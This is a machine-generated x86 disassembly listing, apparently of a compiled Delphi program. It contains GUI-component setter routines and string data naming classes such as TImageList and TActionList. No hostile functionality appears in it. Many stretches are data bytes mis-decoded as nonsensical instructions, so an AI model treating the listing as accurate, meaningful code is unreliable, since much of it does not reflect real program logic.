add [ esi + 0x61 ] dl
inc esp
add [ ecx + 0x44 ] ah
add [ eax + 0x54000000 ] ah
pop ebx
inc esp
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
sub_44615e
inc esp
add [ edi + ebp * 2 + 0x44 ] cl
add [ 0x73754354 ] cl
je r-xdata
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
js r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a1a0
test bl bl
jle r-xdata
mov edx esi
call sub_446680
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0x53ffbe60 ] dh
add [ ebx + esi + 0x40 ] dl
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
add [ ecx + 0x41 ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
loopne r-xdata
mov al [ 0xffffffffa0e40041 ]
inc ecx
add [ eax ] bl
mov eax [ 0xffffffffa1480041 ]
inc ecx
add [ eax - 0x60 ] ch
inc ecx
add ah bh
mov al [ 0xffffffffa1500041 ]
inc ecx
add [ eax + 0x68 ] dh
inc esp
add [ eax + ebp * 2 + 0x68980044 ] al
inc esp
add [ eax + ebp * 2 + 0x68c00044 ] ch
inc esp
add ah dl
push 0x68e80044
inc esp
add ah bh
push 0x69100044
inc esp
add [ ecx + ebp * 2 ] ah
inc esp
add [ eax ] bh
imul eax [ eax + eax + 0x3c ] 0x40004469
imul eax [ eax + eax + 0x44 ] 0x48004469
imul eax [ eax + eax + 0x4c ] 0x50004469
imul eax [ eax + eax + 0x54 ] 0x58004469
imul eax [ eax + eax + 0x5c ] 0x60004469
imul eax [ eax + eax + 0x64 ] 0xb004469
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x1de85653
sar bl cl
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
inc esp
add [ eax ] ch
pop esp
inc esp
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x61e80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x62 ] ah
inc esp
add [ eax ] bl
add [ eax ] al
add [ eax + 0x4c004127 ] bl
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xb0004030
mov al [ 0xffffffffa0ac0041 ]
inc ecx
add ah ah
mov al [ 0xffffffffa1440041 ]
inc ecx
sub_44626c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a1a0
test bl bl
jle r-xdata
mov edx esi
call sub_446680
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4462dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419cb4
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_446384
sub_446310
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4462a0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413c5c
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413de8
sub_446358
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404260
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403ea8
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_446384
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_446680
mov edx ebx
mov eax esi
call sub_446660
sub_4463ac
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_446384
sub_4463d8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45b510
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403300
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a22c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_437234
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446430
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45b538
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403300
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a248
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_437234
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446488
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419854
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44660c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4464f4
push ebx
push esi
push edi
call sub_403490
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403104
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413e54
call sub_403104
mov eax [ edi + 0x30 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4198a0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403478
sub_446544
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44658c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413dc8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov edx edi
call sub_446310
sub_4465d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_448334
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_448378
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_419924
sub_446618
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419b70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_446680
sub_446660
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413c10
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_419924
pop esi
pop ebx
retn
sub_446680
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413eb0
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44669c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_446704
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_4513e8
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_449bd0
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_446fac
mov edx ebp
call sub_44700c
inc eax
je r-xdata
sub_446790
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4467b0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4467d0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_446c20
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_446c20
sub_446968
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a15c
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4469bc
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403104
mov eax [ esi + 0x9c ]
call sub_403104
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44626c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d078
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_446a0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41440c
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_446ab8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_446b18
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_446c20
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_446d58
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_446db8
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_446e14
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_446e78
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446ab8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404260
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403ea8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032b4
test eax eax
je r-xdata
sub_446b18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_446c10
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_4465d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032b4
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_4465bc
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_446b18
sub_446c20
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032b4
test eax eax
je r-xdata
sub_446c98
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404260
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403ea8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413d6c
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413d6c
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
sub_446d00
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032b4
test eax eax
je r-xdata
sub_446d58
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404260
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403ea8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032b4
test eax eax
je r-xdata
sub_446db8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032b4
test eax eax
je r-xdata
sub_446e14
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032b4
test eax eax
je r-xdata
sub_446e78
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_413d6c
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032b4
test eax eax
je r-xdata
sub_446ed8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404260
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_419dac
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_446ab8
sub_446f24
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_446f4c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4463d8
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_446b18
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_446fe0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4153cc
mov edi eax
mov eax esi
call sub_449ebc
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44700c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_447050
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_447075
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44707c
retn
sub_4470fc
clc
mov eax [ eax + eax + 0xb ]
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
insd
popad
push es
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
cld
jno r-xdata
popad
dec ecx
outsb
js r-xdata
inc esp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + esi * 2 ] cl
inc esp
add [ edi ] al
jae r-xdata
add [ eax + 0x73 ] ch
inc esp
add [ ecx + eax * 4 - 0x7ae3ffbc ] dl
inc esp
add ah dl
add [ eax + eax - 0x5c ] 0x9c
inc ecx
add [ eax - 0x65 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
add [ eax ] al
add [ eax + 0x71 ] ah
inc esp
add [ edi ] al
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
imul esi [ ebx + 0x74 ] r-xdata
xor al 0x27
add al cl
jl r-xdata
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
jno r-xdata
add ah dl
jae r-xdata
jb r-xdata
popad
jb r-xdata
or edi [ eax + 0x1fffffff ]
retn
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
add [ edi ] dh
daa
add al dl
mov [ eax + eax + 0x5c ] eax
mov al [ eax + eax - 0x2c ]
add [ eax + eax + 0x1 ] 0x0
out dx eax
jmp esp
inc ecx
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add al cl
jb r-xdata
add [ esp + ebx * 4 - 0x648fffbf ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x72 ] al
inc esp
add [ eax + 0x72 ] cl
inc esp
add [ eax ] ch
add [ eax ] al
cmp [ esi ] ah
inc ecx
add ah al
lahf
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x72 ] ah
inc esp
outsb
je r-xdata
mov eax eax
jno r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0x7164c08b
inc esp
add [ eax ] al
cmp bh 0xff
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
